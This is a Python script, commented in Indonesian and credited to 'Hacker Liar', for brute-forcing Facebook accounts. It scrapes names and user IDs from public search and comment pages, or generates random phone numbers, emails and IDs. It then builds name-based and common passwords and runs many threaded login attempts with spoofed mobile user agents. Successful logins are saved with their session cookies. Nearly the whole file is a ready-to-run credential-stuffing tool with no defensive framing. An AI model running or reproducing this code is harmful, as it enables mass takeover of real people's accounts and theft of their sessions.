#!/usr/bin/env python
# -*- coding with python 3.11 -*-

### --- [ INFORMASI ] --- ###
Author = "Hacker Liar"
Github = "github.com/gevendra115"
Facebook = "facebook.com/gevendra-bhavedi"
Script = "Script Brute Force Account Facebook"
Create = "26 Fab 2024"

### --- [ IMPORT LIBRARY ] --- ###
import requests, re, random, sys, os, time, string, subprocess, bs4
from concurrent.futures import ThreadPoolExecutor

### --- [ WARNA PRINT ] --- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

### --- [ BAGIAN JAM ] --- ###
def kalender():
	struct_time = time.localtime(time.time())
	hari_indonesia = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu","Minggu"]
	hari = hari_indonesia[struct_time.tm_wday]
	tanggal = time.strftime("%d", struct_time)
	bulan = time.strftime("%B", struct_time)
	tahun = time.strftime("%Y", struct_time)
	jam = time.strftime("%H:%M:%S", struct_time)
	return hari, tanggal, bulan, tahun, jam
	
### --- [ MEMBUAT FOLDER ] --- ###
def buat_folder():
	folder = ["OK","CP"]
	for x in folder:
		try: os.mkdir("/sdcard/FBCrack {}".format(x))
		except Exception as e: pass
	
### --- [ VARIABEL ] --- ###
hari, tanggal, bulan, tahun, jam = kalender()
hari_save = f"{hari}-{tanggal}-{bulan}-{tahun}.txt"
ses = requests.Session()
parser = bs4.BeautifulSoup
rr = random.randint
rc = random.choice
dump, ok, cp, loop, list_ua, hasil_akun = [], 0, 0, 0, [], []

### --- [ GENERATOR SANDI ] --- ###
def buat_data(akun):
	user, nama = akun.split("|")[0], akun.split("|")[1].lower()
	pwx, tampung = [], []
	belakang = ["123","1234","12345","123456"]
	namd = nama.split()[0]; namful = nama.replace(" ","")
	namb = nama.split()[-1]
	if len(namful) > 5: pwx.append(namful); pwx.append(nama)
	try:
		nama.split()[1]
		for isi in belakang:
			pwx.append(namd+isi); pwx.append(namb+isi)
		if len(namful) > 5: pwx.append(namful); pwx.append(nama)
	except:
		for isi in belakang: pwx.append(namd+isi)
	for sandi in pwx:
		if len(sandi) < 6 or sandi in tampung or len(''.join(filter(lambda x: not x.isdigit(), sandi))) < 3: continue
		else: tampung.append(sandi)
	return user+"|"+",".join(x for x in tampung)

### --- [ FOR USERAGENT ] --- ###
for os_team in ['re/realme', 'if/infinix']:
	try:
		link = parser(ses.get('https://whatmyuseragent.com/brand/'+os_team).text, "html.parser")
		list_ua.extend([re.findall('Android .*; (.*?) Build', z.text)[0] for z in link.find_all("td", {"class": "useragent"}) if 'Build' in z.text])
	except Exception as e:
		list_ua.append('Redmi Note 10 Pro')
	
def ua_fb():
	rr = random.randint; rc = random.choice; andro = rr(8,14)
	build = "Build/{}.{}.0{}".format(rc(['QP1A', 'SP1A', 'PPR1', 'RP1A', 'OPM1', 'TP1A', 'RKQ1', 'SKQ1']), rr(111111,333333), rr(10,20))
	chrome = "{}.0.{}.{}".format(rr(100,123), rr(1111,6500), rr(100,400))
	return f"Mozilla/5.0 (Linux; Android {andro}; {rc(list_ua)} {build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser Chrome/{chrome} Mobile Safari/537.36"

#while True: input(ua_fb())
### --- [ MENU UTAMA ] --- ###
def menu_utama():
	os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
	print(f'''{H}
 -------------------------------------{h}By @gevendra115---- 
   _____                         _        ______   ____  
  / ____|                       | |      |  ____| |  _ \ 
 | |       _ __    __ _    ___  | | __   | |__    | |_) |
 | |      | '__|  / _` |  / __| | |/ /   |  __|   |  _ < 
 | |____  | |    | (_| | | (__  |   <    | |      | |_) |
  \_____| |_|     \__,_|  \___| |_|\_\   |_|      |____/
-------------------------------------{h}By @gevendra115---- 
                                                         
                                                         
                          
{M}⚔═══════════════════════☠════════════════════════⚔{P}''')
	nopo = input(f"\n[{H}1{P}] Pencarian\n[{H}2{P}] Komentar\n[{H}3{P}] Nomor\n[{H}4{P}] Email\n[{H}5{P}] Random\n[{H}6{P}] File\n[{H}7{P}] Cek hasil\n[{H}?{P}] Pilih : "); print()
	if nopo == "1": Cari_Nama().apa_nama()
	if nopo == "2": dump_komen()
	if nopo == "3": dump_nomor()
	if nopo == "4": dump_email()
	if nopo == "5": dump_random()
	if nopo == "6": dump_file()
	if nopo == "7": cek_hasil()
	else: menu_utama()

###---[ CEK HASIL CRACK ]---###
def cek_hasil():
	no, nox, nom = 0, 0, []
	print(f"[{H}1{P}] Cek hasil ok")
	print(f"[{H}2{P}] Cek hasil cp")
	print(f"[{H}3{P}] Batalkan proses")
	one = input(f'[{H}?{P}] pilih : '); print()
	if one in ['1','01']:
		try:ok = os.listdir('/sdcard/FBCrack OK')
		except: exit(f"[{M}!{P}] Tak hasil")
		for x in ok:
			if 'OK' in str(x):
				nom.append(x); no+=1
				try: jum = open('/sdcard/FBCrack OK/'+x,'r').readlines()
				except: jum = ['']
				print(f'[{H}{no}{P}] {x} | {H}{len(jum)} {P}akun')	
		abc = input(f'[{H}?{P}] Nomor file : '); print()
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/FBCrack OK/'+file,'r').read().splitlines()
		except: exit(f"[{M}!{P}] File tak ada hasil ok")
		for data in buka: nox += 1; print(f"[{H}{nox}{P}] {data}")	
	elif one in ['2','02']:
		try:ok = os.listdir('/sdcard/FBCrack CP')
		except:sys.exit(f"[{M}!{P}] Tak hasil")
		for x in ok:
			if 'CP' in str(x):
				nom.append(x); no+=1
				try: jum= open('/sdcard/FBCrack CP/'+x,'r').readlines()
				except: jum = ['']
				print(f'[{K}{no}{P}] {x} | {K}{len(jum)} {P}akun')	
		abc = input(f'[{K}?{P}] Nomor file : '); print()
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/FBCrack CP/'+file,'r').read().splitlines()
		except: exit(f"[{M}!{P}] File tak ada hasil cp")
		for data in buka: nox += 1; print(f"[{K}{nox}{P}] {data}")	
	else: menu_utama()
	
### --- [ DUMP NAMA 2024 ] --- ###
class Cari_Nama:
	def __init__(self):
		self.daftar = []
		self.sudah = []
	
	def apa_nama(self):
		hackerliar = input(f"[{H}!{P}] Sebutkan satu nama saja\n[{H}?{P}] nama  : ")
		self.limit = input(f"[{H}!{P}] limit : "); print()
		self.daftar.append(hackerliar)
		while True:
			try:
				name = rc(self.daftar)
				if len(dump) >= int(self.limit): break
				if name not in self.sudah: self.url = f"https://x.facebook.com/public/{name}/?locale=id_ID"; self.sudah.append(name); self.dump_nama()
			except KeyboardInterrupt: break
		print('\n\r     '); exit(pilih_metode(''))
	
	def dump_nama(self):
		while True:
			try:
				link = ses.get(self.url).text
				A = re.findall('"FB:TEXT4">(.*?)</div>', link); B = []
				if len(self.daftar)<=50: self.daftar.extend(i for i in A if i not in self.daftar)
				B.extend(z for z in [x for x in re.findall('result_id:(\d+),', link)] if z not in B)
				result = ['|'.join(pair) for pair in zip(B, A)]
				dump.extend(t for t in result if t not in dump)
				for s in result: print(f"\r[{H}!{P}] {s.split('|')[0]} | {len(dump)} ", flush=True, end="")
				self.url=re.findall('"see_more_pager",href:"(.*?)",',link)[0]
			except Exception as e: break
			
### --- [ TANYA METODE ] --- ###
def pilih_metode(password):
	global ok, cp
	fb = [z for z in random.sample(dump, len(dump))]; dump.clear(); dump.extend(fb); daftar_url = ['free.facebook.com', 'm.prod.facebook.com', 'free.prod.facebook.com']; nomor = 1; me = []
	for url in daftar_url: print(f"[{H}{nomor}{P}] {url}"); nomor += 1
	no_url = input(f"[{H}?{P}] Pilih : "); print()
	try: main_url = daftar_url[int(no_url)-1]
	except: main_url = "free.facebook.com"	
	if password:
		for data_akun in dump:
			me.append(data_akun+'|'+','.join(x for x in password))
	else:
		for data_akun in dump:
			me.append(buat_data(data_akun))
	print(f"\r[{H}!{P}] akun ok : {H}OK{P}/{hari_save}")
	print(f"[{H}!{P}] akun cp : {K}CP{P}/{hari_save}\n")	
	with ThreadPoolExecutor (max_workers=35) as fb:
		for data_akun in me:
			user, sandi = data_akun.split('|')
			fb.submit(metode_log, user, sandi.split(','), main_url)
	print(f"\r[{H}!{P}] Hasil crack ok:{H}{ok}{P} cp:{K}{cp}{P} dari {H}{len(dump)}{P} dump")

### --- [ DUMP KOMEN 2024 ] --- ###
def dump_komen():
	next = 0
	print(f"[{H}!{P}] Masukan link target")
	target = input(f"[{H}?{P}] target : ")
	print(f"[{H}!{P}] Tekan ctrl c untuk stop\n")
	if "app=fbcrack" in target: main_link = target.replace("www", "x").split("?app=fbcrack")[0]
	else: main_link = target.replace("www", "x")
	while True:
		try:
			fb = False
			link = ses.get(main_link+f"?p={next};refid=18;__tn__=-R")
			for id,na in re.findall(r'data-sigil="feed_story_ring(\d+)".*?<div class=".*?">([^<]+)</div>', link.text):
				result = f"{id}|{na}"
				if result not in dump: fb = True; dump.append(result); print(f"\r[{H}!{P}] {result.split('|')[0]} | {len(dump)} ", flush=True, end="")
			next += 30
			if not fb: break
		except KeyboardInterrupt: break
		except Exception as e: break
	print('\n\r     '); pilih_metode('')
	
### --- [ DUMP NOMOR ] --- ###
def dump_nomor():
	print(f"[{H}!{P}] Masukan digit depan ({K}0831{P})")
	depan = input(f"[{H}?{P}] digit : "); print()
	while True:
		nomor = "{}-{}-{}".format(depan, rr(1111,9999), rr(1111,9999))
		print(f"\r[{H}!{P}] {nomor} | {len(dump)} ", flush=True, end="")
		if nomor not in dump: dump.append(nomor)
		if len(dump)>=5001: break
	print('\n\r     '); pilih_metode(["123456","12345678","123456789","katasandi","rahasia"])

### --- [ DUMP EMAIL ] --- ###
def dump_email():
	print(f"[{H}!{P}] Masukan nama target")
	nama = input(f"[{H}?{P}] Target : ").lower(); print()
	if len(nama)<3: exit(f"[{M}!{P}] Nama harus 3 kata")
	while True:
		format = rc([f"{nama}{rr(1,9999)}", f"{nama}.{rr(1,9999)}", f"{nama}{rr(1,31)}{rr(1,12)}{rr(1990,2024)}", f"{nama}{rr(1,9999)}.{rr(1,9999)}", f"{nama}.{rr(1,9999)}.{rr(1,9999)}", f"{rr(1,9999)}{nama}", f"{rr(1,9999)}.{nama}"])
		result = f"{format}@gmail.com|{nama}"
		print(f"\r[{H}!{P}] {result.split('|')[0]} | {len(dump)} ", flush=True, end="")
		if result not in dump: dump.append(result)
		if len(dump)>=5001: break
	print('\n\r     '); pilih_metode('')
			
### --- [ DUMP RANDOM ] --- ###
def dump_random():
	print(f"[{H}!{P}] Masukan target id akun")
	depan = input(f"[{H}?{P}] Target : ")[:-5]; print()
	while True:
		nomor = "{}{}".format(depan, rr(11111,99999))
		print(f"\r[{H}!{P}] {nomor} | {len(dump)} ", flush=True, end="")
		if nomor not in dump: dump.append(nomor)
		if len(dump)>=5001: break
	print('\n\r     '); pilih_metode(["123456","12345678","password","123456789","mencintai"])

### --- [ DUMP FILE ] --- ###
def dump_file():
	print(f"[{H}!{P}] Masukan nama file")
	depan = input(f"[{H}?{P}] input : "); print()
	try:
		for nomor in open(depan, "r").read().splitlines():
			try: dump.extend(open(depan, "r").read().splitlines()); print(f"\r[{H}!{P}] {nomor.split('|')[0]} | {len(dump)} ", flush=True, end=""); break
			except: exit("[!] Format file salah")
	except FileNotFoundError: exit("[!] File tak ada")
	print('\n\r     '); pilih_metode('')

### --- [ METODE REGULAR ] --- ###
def metode_log(user, password, url):
	global ok, cp, loop
	print(f"\r[{H}!{P}] {P}On {H}{loop}{P}/{K}{len(dump)}{P}|{H}{ok}{P}/{K}{cp}{P}  ",flush=True, end = "")
	for pw in password:
		try:
			ses = requests.Session(); ua = ua_fb()
			try: com = re.findall('Chrome/(\d+).', ua)[0]
			except: com = '122'
			head_get = {'Host': url, 'sec-ch-ua': f'"Not A(Brand";v="99", "Android WebView";v="{com}", "Chromium";v="{com}"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			link = ses.get('https://{}/login.php?next=https://{}/home.php?refsrc=deprecated&hrc=1&_fb_noscript=true&refsrc=deprecated&_rdr'.format(url, url), headers=head_get)
			date = {'lsd': re.search('name="lsd" value="(.*?)"', link.text).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', link.text).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"', link.text).group(1), 'li': re.search('name="li" value="(.*?)"', link.text).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'pass': pw, 'login': 'Masuk', 'bi_xrwh': '0'}
			head_post = {'Host': url, 'content-length': '{}'.format(len(str(date))), 'cache-control': 'max-age=0', 'dpr': str(rr(1,3)), 'viewport-width': '980', 'sec-ch-ua': f'"Not A(Brand";v="99", "Android WebView";v="{com}", "Chromium";v="{com}"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '""', 'sec-ch-ua-model': '""', 'sec-ch-ua-full-version-list': '', 'sec-ch-prefers-color-scheme': 'dark', 'upgrade-insecure-requests': '1', 'origin': f'https://{url}', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'cookie': ';'.join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()]), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': link.url, 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			ses.post('https://{}/login/device-based/regular/login/?next=https%3A%2F%2F{}%2Fhome.php%3Frefsrc%3Ddeprecated&refsrc=deprecated&lwv=100&refid=9'.format(url, url), data=date, headers=head_post, allow_redirects=False)
			host = ses.cookies.get_dict()
			if "c_user" in str(host):
				if user not in hasil_akun: hasil_akun.append(user); coki = (';').join(["%s=%s"%(name,value) for name,value in host.items()]); print(f"\r[{H}!{P}] {H}{user}{P}|{H}{pw}{P}|{H}{coki}"); ok += 1; open("/sdcard/FBCrack OK/OK-"+hari_save, "a").write(f"{user}|{pw}|{coki}\n"); break
			elif "checkpoint" in str(host):
				if user not in hasil_akun: hasil_akun.append(user); print(f"\r[{H}!{P}] {K}{user}{P}|{K}{pw}{P}     "); cp += 1; open("/sdcard/FBCrack CP/CP-"+hari_save, "a").write(f"{user}|{pw}\n"); break
			else: continue; ses.close()
		except requests.exceptions.ConnectionError:
			time.sleep(10); metode_log(user, password, url)
	loop += 1
	
if __name__ == "__main__":
	buat_folder(); menu_utama()
##############################################################
#####################                #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
#This Tool by Hacker Liar
#Have a nice day :)
#GoodBye    
